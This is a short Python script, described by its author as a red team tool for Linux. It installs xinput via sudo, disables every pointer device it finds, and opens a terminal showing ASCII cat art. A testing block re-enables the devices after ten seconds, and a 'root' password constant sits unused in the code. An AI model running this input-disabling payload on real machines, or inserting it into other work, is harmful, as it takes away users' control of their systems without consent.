#!/usr/bin/env python3
# Author: Ashley Jablonski
#
# red team tool that will disable mouse functionality and pop up with a cat ascii art
# runs on linux

# imports
import subprocess as sp
import os
import time

# CONSTANTS
PASSWORD = "root"
ASCII_CAT = """
           X                   X              
             XXX                 XXX             
            XX XX               XX XX            
           XX   XX             XX   XX           
          XX    XX            XX     XX          
         XX       XXXXXXXXXXXXX       XX         
        X                               X        
XXX    X                                 X    XXX
   XXXX      XX                  XX       XXXX   
      X      XX                  XX       X      
   XXXXX          X   XX   X              XXXX   
XXX     X          X X  X X              X    XXX
         X          X    X              X        
          X                            X         
           XXXXXXXXXXXXXXXXXXXXXXXXXXXX    

"""

# create ascii art file
os.system(f'echo "{ASCII_CAT}" >> /tmp/cat.txt')

try:
    # install xlist
    sp.run(["sudo", "apt", "install", "-y", "xinput"], check=True)
except Exception as e:
    print(f"error occured during installing xlist: {e}")
else:
    # getting mouse devices
    output = sp.run("xinput list", capture_output=True, text=True, shell=True)
    #print("output: ", output)
    cleaned = output.stdout.split("\n")
    print("cleaned: ", cleaned)

    capture_flag = True
    # get the id of the mouse devices
    ids = []
    for line in cleaned:
        # split lines to search in for loop

        # Check if we are under 'Virtual core pointer' section
        if "Virtual core pointer" in line:
            capture_flag = True
        elif "Virtual core keyboard" in line:
            capture_flag = False  # Stop capturing once we reach the keyboard section

        if capture_flag:
            tokens = line.split()
            print("tokens: ", tokens)
            # find id
            for token in tokens:
                print(token)
                if "id=" in token:
                    print("token found", token)
                    #if token.startswith("id="):
                        # get the id value from 'id=<number>'
                    ids.append(token.split('=')[1])  
                else:
                    pass
        else:
            print("not a mouse: ", line)

    print("ids found: ", ids)

    # disable ALL of the ids, since you dont know what the actual one is
    for id in ids:
        try:
            os.system(f"xinput disable {id}")
            print(f"disabled {id}")
        except Exception as e:
            print(f"error occured during disabling id {id}: {e}")

    # print cat to new terminal
    try:
        os.system('xterm -e "bash -c \'cat /tmp/cat.txt; exec bash\'"')
        # print(ASCII_CAT)
    except Exception as e:
        print(f"error with cat: {e}")


# testing purposes only -- will sleep fo 10 seconds then repair the damage by enabling all drivers again
time.sleep(10)

print("enabling mouse again")
# disable ALL of the ids, since you dont know what the actual one is
for id in ids:
    try:
        os.system(f"xinput enable {id}")
        print(f"enabled {id}")
    except Exception as e:
        print(f"error occured during enabling id {id}: {e}")